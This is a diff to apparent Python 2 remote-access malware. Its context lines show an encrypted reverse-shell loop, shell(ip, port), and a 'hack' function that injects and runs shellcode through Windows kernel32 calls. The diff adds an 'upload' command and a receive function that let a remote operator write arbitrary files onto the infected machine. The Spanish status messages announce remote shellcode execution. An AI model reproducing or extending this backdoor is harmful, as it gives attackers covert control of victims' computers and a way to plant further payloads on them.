@@ -144,7 +144,21 @@ def hack(code):
                                              ctypes.pointer(ctypes.c_int(0)))
      
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-    
+
+#Receive Data Method
+def receive(con, file):
+    f = open(file,'wb')
+    con.listen(5)                 # Now wait for client connection.
+    print "Receiving..."
+    l = con.recv(1024)
+    while (l != 'File has been sent'):
+        print "Receiving..."
+        f.write(l)
+        l = con.recv(1024)
+    f.close()
+    print "Done Receiving"    
+    con.close()                # Close the connection
+
 
 def shell(ip, port):
     #CipherAES Object
@@ -164,6 +178,12 @@ def shell(ip, port):
                 encoded = encodeCipher(aes, response)
                 s.send(encoded)
                 break
+            elif cmd == 'upload':
+                response = "Nombre del fichero, por favor"            
+                encoded = encodeCipher(aes, response)
+                s.send(encoded)
+                filename = decodeCipher(aes, s.recv(4096)) #Receive filename
+                receive(s, filename)
             elif cmd == "hack":
                 response = "Se ha habilitado la ejecucion de ShellCode remoto"            
                 encoded = encodeCipher(aes, response)
